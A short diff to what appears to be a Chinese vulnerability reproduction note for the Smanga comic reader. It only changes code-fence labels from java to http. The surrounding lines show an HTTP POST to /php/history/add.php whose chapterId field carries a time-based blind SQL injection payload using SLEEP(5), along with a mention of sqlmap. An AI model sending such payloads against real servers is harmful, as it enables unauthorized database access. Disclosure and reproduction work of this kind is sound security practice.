@@ -69,7 +69,7 @@ Smanga无需配置，docker直装的漫画流媒体阅读工具。以emby plex�
 
 
 # 四、漏洞复现
-```java
+```http
 POST /php/history/add.php HTTP/1.1
 Host: 
 Cache-Control: max-age=0
@@ -89,7 +89,7 @@ chapterCover=1&chapterId=1' AND (SELECT 6064 FROM (SELECT(SLEEP(5)))bcUs) AND 'I
 
 sqlmap
 
-```java
+```http
 POST /php/history/add.php HTTP/1.1
 Host: 
 Cache-Control: max-age=0
